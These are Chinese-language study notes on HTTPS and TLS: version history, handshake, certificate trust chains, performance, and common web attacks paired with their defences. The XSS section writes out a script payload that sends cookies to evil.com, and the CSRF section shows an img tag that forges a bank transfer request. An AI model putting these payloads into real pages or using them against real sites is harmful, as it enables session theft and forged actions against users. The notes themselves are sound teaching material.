# 📌 HTTPS

## 📄 TLS / SSL 是什么

**TLS**（Transport Layer Security，传输层安全协议）就是 HTTPS 里那个 "S"。HTTPS = HTTP + TLS。

**SSL**（Secure Sockets Layer，安全套接层）是 TLS 的前身，由 Netscape（网景公司）在 1994 年发明。TLS 是 SSL 的升级版，由 IETF（互联网工程任务组）标准化。现在行业里说的 SSL 其实都是 TLS，只是名字沿用了。

### SSL/TLS 版本历史

| 版本 | 年份 | 发明者 | 状态 | 说明 |
|------|------|--------|------|------|
| SSL 2.0 | 1995 | Netscape | 已废弃 | 第一个公开发布的版本，有多个严重漏洞 |
| SSL 3.0 | 1996 | Netscape | 已废弃 | 重写设计，修复了 2.0 的漏洞；2014 年被 POODLE 攻击击破 |
| TLS 1.0 | 1999 | IETF | 已废弃 | SSL 3.0 的标准化升级，改名 TLS；2020 年主流浏览器停止支持 |
| TLS 1.1 | 2006 | IETF | 已废弃 | 小版本迭代，修复了 CBC 攻击等问题 |
| TLS 1.2 | 2008 | IETF | 主流 | 引入 AEAD 加密（如 AES-GCM），目前使用最广泛 |
| TLS 1.3 | 2018 | IETF | 推荐 | 握手从 2-RTT 降到 1-RTT，移除所有弱算法，支持 0-RTT |

### 为什么改名 SSL → TLS？

SSL 是 Netscape 的商标，Netscape 被 AOL 收购后，IETF 为了标准化和去商业化，将协议改名为 TLS。技术上 TLS 1.0 就是 SSL 3.1，但名称独立了。

### TLS 做三件事

| 能力 | 说明 | 防御什么 |
|------|------|----------|
| 加密 | 数据传输加密，第三方看不懂 | 窃听 |
| 身份验证 | 通过证书确认服务端身份 | 冒充 |
| 完整性 | 数据被篡改会校验失败 | 中间人篡改 |

### 命名速查

| 名称 | 全称 | 说明 |
|------|------|------|
| SSL | Secure Sockets Layer | 旧名，Netscape 发明 |
| TLS | Transport Layer Security | 新名，IETF 标准化 |
| HTTPS | HTTP over TLS | HTTP + TLS 加密 |
| SSL 证书 | TLS 证书 | 行业习惯叫 SSL 证书，其实都是 TLS |
| SSL/TLS | — | 并称，表示同一类协议 |

## 📄 HTTP vs HTTPS

| 维度 | HTTP | HTTPS |
|------|------|-------|
| 端口 | 80 | 443 |
| 传输 | 明文 | 加密（TLS） |
| 证书 | 不需要 | 需要 CA 签发的证书 |
| 性能 | 快 | 握手阶段多 1-2 个 RTT，数据传输几乎无差异 |
| SEO | 无优势 | 搜索引擎优先收录 |
| 防篡改 | 无 | 有，数据被篡改会校验失败 |

## 📄 TLS 握手流程

```
1. Client Hello
   客户端 → 服务端：支持的 TLS 版本 + 加密算法列表 + 随机数 A

2. Server Hello
   服务端 → 客户端：选定的加密算法 + 随机数 B + 服务端证书

3. 证书验证
   客户端：用 CA 公钥验证证书是否合法、是否过期、域名是否匹配

4. 密钥交换
   客户端：生成预主密钥（Pre-Master Secret），用服务端公钥加密后发送

5. 会话密钥生成
   双方：用 随机数 A + 随机数 B + 预主密钥 生成对称密钥（Session Key）

6. 加密通信开始
   后续所有数据用 Session Key 做 AES 对称加密传输
```

**一句话：** 前 4 步用非对称加密交换密钥，第 5 步生成对称密钥，第 6 步开始对称加密通信。

## 📄 证书机制

### 基本概念

| 概念 | 说明 |
|------|------|
| CA（Certificate Authority） | 证书颁发机构，给网站签发"身份证"的第三方 |
| 证书内容 | 域名、公钥、有效期、CA 签名 |
| 证书链 | 根证书 → 中间证书 → 站点证书，层层信任 |
| 自签名证书 | 自己签发的证书，浏览器不信任（开发环境可用） |
| Let's Encrypt | 免费 CA，自动化签发，适合个人和小团队 |

### CA 怎么保证安全？

**核心机制：根证书预埋。** 浏览器和操作系统出厂时就内置了受信任的根证书列表（根证书 = CA 的公钥 + 签名）。这些根证书是操作系统厂商（Apple、Microsoft、Google、Mozilla）审核后预装的。

**信任链：**

```
根证书（操作系统预埋，绝对信任）
  └── 中间证书（根 CA 签发）
       └── 站点证书（中间 CA 签发，给网站用）
```

**验证链：** 浏览器收到站点证书 → 看是谁签的（中间 CA）→ 看中间 CA 的证书是谁签的（根 CA）→ 根 CA 在预埋列表里 → 信任。

**CA 的信任基础：**

| 层面 | 机制 |
|------|------|
| 技术 | 根证书预埋在操作系统/浏览器中，无法伪造 |
| 审核 | CA 要通过 WebTrust 等审计，才能被操作系统厂商认可 |
| 签名 | CA 用私钥给证书签名，浏览器用预埋的公钥验证，私钥泄露则信任崩塌 |
| 吊销 | 证书有问题时，CA 通过 CRL / OCSP 机制宣布吊销 |

### CA 出问题会怎样？

| 事件 | 后果 |
|------|------|
| CA 私钥泄露 | 攻击者可以伪造任意网站的证书，中间人攻击畅通无阻 |
| CA 签发错误证书 | 浏览器厂商会把该 CA 从信任列表中移除 |
| CA 被攻破 | 同上，信任链断裂 |

**历史教训：** 2011 年荷兰 CA 机构 DigiNotar 被黑客入侵，签发了 Google 的伪造证书。事发后所有浏览器立即移除了 DigiNotar 的根证书，DigiNotar 直接破产。

### 浏览器怎么验证证书？

1. 看证书是否由受信任的 CA 签发（检查证书链）
2. 看证书是否过期
3. 看证书域名是否和访问的域名一致
4. 看证书是否被吊销（CRL / OCSP）

验证失败 → 浏览器显示"不安全"警告，用户可以选择继续（不建议）。

### 自签名证书 vs CA 证书

| 维度 | CA 签发 | 自签名 |
|------|---------|--------|
| 浏览器信任 | 信任 | 不信任，显示警告 |
| 适用场景 | 生产环境 | 开发/测试环境 |
| 成本 | 免费（Let's Encrypt）或付费 | 免费 |
| 安全性 | 有 CA 背书 | 自己担保自己 |

## 📄 性能开销

| 阶段 | 开销 | 优化手段 |
|------|------|----------|
| 握手 | 多 1-2 个 RTT | TLS 1.3 减少到 1 个 RTT；Session Resumption 跳过握手 |
| 加密计算 | CPU 开销 | 硬件加速（AES-NI）；TLS 1.3 算法更精简 |
| 证书验证 | OCSP 查询 | OCSP Stapling（服务端缓存证书状态） |

**TLS 1.3 vs 1.2：**

| 维度 | TLS 1.2 | TLS 1.3 |
|------|---------|---------|
| 握手 RTT | 2 个 | 1 个 |
| 密钥交换 | RSA / DH / ECDHE | 仅 ECDHE（更安全） |
| 加密算法 | 可协商弱算法 | 移除所有弱算法 |
| 0-RTT | 不支持 | 支持（可选，有重放风险） |

## 📄 常见网络攻击

### 中间人攻击（MITM）

**原理：** 攻击者插入到客户端和服务端之间，拦截、窃听、篡改通信内容，双方都以为在和对方直接通信。

```
客户端 ←→ 攻击者 ←→ 服务端
         （窃听/篡改）
```

**攻击场景：** 公共 WiFi、ARP 欺骗、代理劫持。

**HTTPS 防御：** TLS 握手时验证证书，攻击者无法伪造合法证书，证书不匹配浏览器会报警。

### DNS 劫持

**原理：** 篡改 DNS 解析结果，把域名指向攻击者的 IP，用户访问的是假网站。

```
正常：example.com → 1.2.3.4（真实服务器）
劫持：example.com → 5.6.7.8（攻击者服务器）
```

**攻击层面：** 本地 DNS 缓存投毒、运营商 DNS 劫持、路由器 DNS 篡改。

**HTTPS 防御：** 部分防御。攻击者没有合法证书，浏览器会显示"不安全"警告。但用户如果忽略警告继续访问，仍然会被钓鱼。

### CSRF（跨站请求伪造）

**原理：** 利用浏览器自动携带 Cookie 的特性，诱导用户在已登录的网站上执行非本意的操作。

```
1. 用户登录 bank.com，浏览器存了 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面中有 <img src="bank.com/transfer?to=hacker&amount=1000">
4. 浏览器自动带上 bank.com 的 Cookie，请求发出，转账成功
```

**防御：** SameSite Cookie 属性、CSRF Token、检查 Referer/Origin 头。

### XSS（跨站脚本攻击）

**原理：** 往网页中注入恶意 JavaScript 代码，窃取用户数据（Cookie、Token 等）。

```
1. 攻击者在评论区注入 <script>document.location='evil.com/steal?cookie='+document.cookie</script>
2. 其他用户浏览该页面，脚本执行，Cookie 被盗
```

**防御：** 输入输出转义、Content-Security-Policy（CSP）头、HttpOnly Cookie（JS 读不到）。

### DDoS（分布式拒绝服务）

**原理：** 大量僵尸网络同时请求目标服务器，耗尽带宽/计算资源，正常用户无法访问。

**攻击类型：**

| 类型 | 层面 | 例子 |
|------|------|------|
| 流量型 | 网络层 | UDP 洪水、ICMP 洪水 |
| 协议型 | 传输层 | SYN 洪水、TCP 连接耗尽 |
| 应用型 | 应用层 | HTTP 洪水、Slowloris（慢速连接） |

**防御：** CDN 分流、WAF 防护、限流、云厂商 DDoS 高防服务。

### 攻击与防御对照表

| 攻击 | 目标 | HTTPS 能防？ | 其他防御 |
|------|------|-------------|----------|
| 中间人攻击 | 窃听/篡改传输 | 能 | 证书锁定（Certificate Pinning） |
| DNS 劫持 | 篡改域名解析 | 部分能 | DNS over HTTPS（DoH）、DNSSEC |
| CSRF | 伪造用户请求 | 不能 | SameSite Cookie、CSRF Token |
| XSS | 注入恶意脚本 | 不能 | 输入转义、CSP、HttpOnly Cookie |
| DDoS | 拒绝服务 | 不能 | CDN、WAF、限流、高防 |

## 📄 常见问题

| 问题 | 答案 |
|------|------|
| HTTPS 能防中间人攻击吗？ | 能，前提是证书验证不被绕过 |
| HTTPS 能防 DNS 劫持吗？ | 部分能，证书域名不匹配会报错 |
| HTTPS 数据绝对安全吗？ | 传输过程加密，但端点（客户端/服务端）的数据不受保护 |
| 为什么有些网站 HTTP 也能用？ | 没有强制跳转，建议配置 301 重定向到 HTTPS |
| 证书过期了怎么办？ | 续签证书，Let's Encrypt 支持自动续签 |

## 🌳 生长思考

- **HTTPS = 非对称加密交换密钥 + 对称加密传输数据** — 混合加密是核心思想，不要只记流程
- **证书的本质是信任链** — 浏览器信任 CA，CA 签发证书，所以浏览器信任网站
- **TLS 1.3 是趋势** — 握手更快、算法更安全、配置更简单，新项目直接用 1.3
